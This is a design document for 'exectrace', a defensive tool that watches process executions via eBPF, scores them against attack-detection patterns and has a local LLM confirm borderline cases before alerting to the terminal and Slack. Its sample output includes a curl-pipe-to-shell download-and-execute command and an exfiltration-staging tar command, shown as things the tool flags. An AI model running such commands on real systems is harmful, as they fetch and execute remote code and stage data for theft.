# Architecture & Design v2 — `exectrace` (terminal-first, eBPF + LLM)

## What changed (the mentor pivot)

- **No UI.** Output is the **terminal** (alert lines as they happen) + an optional **Slack** sink.
- **Threshold-based alerting** — only things above a risk threshold surface.
- **Built in iterations** — each iteration is a *working end-to-end slice*, not a layer.
- **Reuse our own red/blue work.** The prior **SENTRY** tool is the detection brain; **PhantomTrace** gives us a labeled 220-command corpus for eval, few-shot, and a deterministic demo.
- **Unchanged:** our own eBPF (C) + a Go pipeline + a local LLM.

## The pipeline

```
process exec ─► eBPF execve (C) ─► Go collector ─► deterministic scoring ─► THRESHOLD ROUTER ─► terminal + Slack
                  (full argv)        (normalize)     (SENTRY patterns,         │
                                                       banded)                  ├─ HIGH ≥0.75  → ALERT now
                                                                                ├─ GRAY .35–.75 → LLM confirm ─► ALERT if confirmed
                                                                                └─ LOW <0.35   → ignore (log only)
```

The deterministic engine answers instantly and works with **zero LLM**; the LLM is a **second analyst** that prunes false positives on the GRAY band and hunts sequence campaigns the rules missed. That means the demo survives an Ollama hiccup — the floor is the rule engine.

## The threshold = the SENTRY bands (this is the "threshold" you asked for)

Grounded in MITRE ATT&CK / LOLBAS / GTFOBins, ported from `sentry/scoring.py`:

| Band | Score | Action |
|------|-------|--------|
| **LOW** | `< 0.35` | ignore (log only) |
| **GRAY** | `0.35 – 0.75` | escalate to the LLM for a confirm/prune verdict |
| **HIGH** | `≥ 0.75` | alert immediately (terminal + Slack) |

Plus **correlation escalation**: a group of individually-benign commands (recon → cred-dump → staging → exfil) that share an artifact escalates as a *combo* even when no single line is HIGH. All thresholds are config (flags/env).

## Components & owners (no UI — rebalanced)

| | Owner | Owns |
|---|-------|------|
| **P1** | eBPF / Kernel (C) | `execve` with full argv (M1), then `connect`/`dup2`/`fork`/`exit` for behavioral signals; ring buffer; `bpf2go` |
| **P2** | Collector + Scoring + LLM (Go) | normalize argv; **port SENTRY's patterns/combos/bands to Go**; banded scoring + correlation; the LLM confirmation pass (Phi-3 via Ollama) |
| **P3** | Output + Eval + Integration | terminal reporter + threshold config + **Slack sink**; the **corpus replay + eval harness** (220 rows → TP/FP vs ground truth); Makefile/run; README; demo |

> With the UI gone, P3 is now the **alerting + evaluation + integration** seat — the eval harness (does it find the 20 without false alarms?) is the scientific backbone of the whole project, and it's demoable on its own.

## Contracts (slimmed — no UI seam)

- **P1 → P2** — `struct event` (binary, ring buffer). For M1: `pid, ppid, uid, comm, argv[]`.
- **P2 → P3** — a **Verdict line** (Go struct / JSON): `{command, score, band, verdict, reason, mitre, tactic, pid, ts}`.
- **P3 reporter** → terminal (formatted line) **and** Slack (webhook payload for HIGH / confirmed).

## Reusing the prior project (concretely)

- **Detection brain → Go:** port `sentry/knowledge/standalone.py` (385 patterns), `combos.py` (31 correlations), `baselines.py` (~20 benign suppressors), and the `scoring.py` bands. They're just `regex + weight + MITRE + tactic` tuples — mechanical to translate; Claude can auto-generate the Go tables from the Python.
- **LLM pass:** mirror `ai_confirm.py`'s **PRUNE / VERIFY / HUNT** modes and the "**explain why**" rule (every verdict carries a one-line reason).
- **Corpus for eval/demo:** run PhantomTrace `--os linux` → 220 rows (exactly 20 malicious, twin-traps, sequence-based). Use the `*_ground_truth.txt` to score **recall** (find the 20) and **precision** (don't over-flag the benign twins).
- **The bridge:** P3's **replay injector** reads a corpus CSV (`process_name, command_line`) and feeds each row into the collector as a synthetic exec event, so the *same* scoring + LLM path runs on it — eval and live use one code path.

## Terminal output (the MVP deliverable)

A live tail; flagged lines stand out with band, score, reason, MITRE; a summary on exit. e.g.:

```
10:00:01  curl -fsSL http://10.0.0.9/s.sh | sh        HIGH 0.85  curl|sh download-and-execute  [T1059/T1105]
10:00:04  tar czf /tmp/.cache/a.tgz /var/data         GRAY 0.40  staging archive → LLM: MALICIOUS (exfil staging)  [T1560]
10:00:05  ls -la                                       LOW  0.00  —
── summary ──  scanned 220 · flagged 19 · HIGH 12 · GRAY-confirmed 7 · time 0.4s + 6.2s LLM
```

## Slack (optional sink, within reach)

HIGH and confirmed-GRAY → webhook POST `{command, score, reason, mitre, host, time}`. One stretch goal from the brief, very demoable.

## Model

**Phi-3-mini Q4 via Ollama**, local, async — only the GRAY minority hits it, so cost/latency stay low. README answers: local vs hosted (data never leaves the box, offline, no per-call cost vs smaller model) and what that means for a sensor.

## Non-goals & notes

No UI, no process killing. SENTRY was Windows-heavy and CSV-fed; many Windows patterns simply won't fire on Linux execs (expected) — we focus the port on the Linux-relevant patterns + combos. Same brain, now on **live** eBPF input instead of a static CSV.
